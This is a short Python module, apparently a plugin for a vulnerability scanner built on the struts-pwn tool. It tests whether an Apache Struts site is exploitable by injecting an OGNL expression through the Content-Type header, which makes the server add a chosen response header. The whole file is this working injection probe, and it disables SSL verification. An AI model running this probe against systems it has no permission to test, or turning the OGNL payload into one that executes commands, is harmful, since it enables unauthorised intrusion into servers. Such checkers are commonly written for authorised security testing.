import random
import requests

rhost = ''
timeout = 3
settings = {
        'rhost': {'Desc': '(url) website to test', 'Value': rhost},
        'timeout': {'Desc': '(int) request timeout', 'Value': timeout}
        }


# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception as e:
    print('[-] Error: '+str(e))
    pass

def reloadSettings():
    global rhost, timeout
    settings['rhost']['Value'] = rhost
    settings['timeout']['Value'] = timeout

def exploit():
    global rhost
    random_string = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(7))

    payload = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']."
    payload += "addHeader('%s','%s')}.multipart/form-data" % (random_string, random_string)
    headers = {
        'User-Agent': 'struts-pwn (https://github.com/mazen160/struts-pwn)',
        # 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
        'Content-Type': str(payload),
        'Accept': '*/*'
    }

    try:
        resp = requests.get(rhost, headers=headers, verify=False, timeout=timeout, allow_redirects=False)
        if ((random_string in resp.headers.keys()) and (resp.headers[random_string] == random_string)):
            #result = True
            print('[+] Host is vunurable')
        else:
            #result = False
            print('[-] Host is invunurable')
    except Exception as e:
        print("[-] Error:  " + str(e))
